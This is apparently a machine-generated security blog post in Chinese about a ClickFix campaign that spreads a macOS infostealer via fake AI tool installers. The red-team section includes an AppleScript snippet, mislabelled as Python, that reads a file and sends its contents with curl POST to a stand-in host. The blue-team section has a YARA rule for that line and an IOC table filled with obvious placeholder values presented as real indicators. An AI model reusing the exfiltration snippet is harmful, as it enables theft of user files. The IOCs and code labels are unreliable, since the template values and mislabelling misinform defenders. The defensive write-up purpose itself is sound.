---
layout: post
title:  "ClickFix Campaigns Spread MacSync macOS Infostealer via Fake AI Tool Installers"
date:   2026-03-16 12:55:58 +0000
categories: [security]
severity: high
---

# 🔥 解析 ClickFix 攻擊：利用社會工程學和惡意腳本進行 macOS 資訊竊取

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: Info Leak (資訊竊取)
> * **關鍵技術**: 社會工程學、惡意腳本、AppleScript

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ClickFix 攻擊利用社會工程學手法，欺騙用戶執行惡意腳本，從而竊取 macOS 系統中的敏感資訊。
* **攻擊流程圖解**:
  1. 用戶點擊惡意連結或搜索結果，導致瀏覽器跳轉到假的 Google Sites 頁面。
  2. 用戶按照頁面上的指示，打開 Terminal 並執行惡意命令，下載並運行 shell 腳本。
  3. shell 腳本連接到惡意伺服器，下載 AppleScript 信息竊取 payload。
  4. AppleScript payload 執行，竊取用戶的敏感資訊，包括密碼、檔案、金鑰鏈資料庫和加密貨幣錢包的種子短語。
* **受影響元件**: macOS 系統，特別是那些使用 Terminal 和 AppleScript 的用戶。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶需要點擊惡意連結或搜索結果，並按照頁面上的指示執行惡意命令。
* **Payload 建構邏輯**:

    ```
    
    python
      # 惡意 AppleScript payload 範例
      tell application "System Events"
        set filePath to "/path/to/sensitive/file"
        set fileContents to read filePath
        -- 竊取檔案內容
        do shell script "curl -X POST -d '" & fileContents & "' https://malicious-server.com"
      end tell
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全軟件的檢測，例如使用加密或壓縮的 payload，或者利用系統中的漏洞。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | malicious-server.com | /path/to/malicious/script |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule ClickFix_Detection {
        meta:
          description = "Detects ClickFix attacks"
          author = "Your Name"
        strings:
          $a = "curl -X POST -d"
          $b = "https://malicious-server.com"
        condition:
          all of ($a, $b)
      }
    
    ```
* **緩解措施**: 用戶應該避免點擊來自不明來源的連結或搜索結果，並在 Terminal 中執行命令之前仔細檢查命令的內容。系統管理員可以設定 Terminal 來禁止執行未經授權的腳本，並使用安全軟件來檢測和防止惡意活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **社會工程學 (Social Engineering)**: 一種攻擊手法，利用人類心理和行為的弱點來欺騙用戶執行惡意行為。
* **AppleScript**: 一種腳本語言，用于自動化 macOS 系統中的任務。
* **Shell 腳本 (Shell Script)**: 一種腳本語言，用于自動化 Unix-like 系統中的任務。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/clickfix-campaigns-spread-macsync-macos.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1059/)


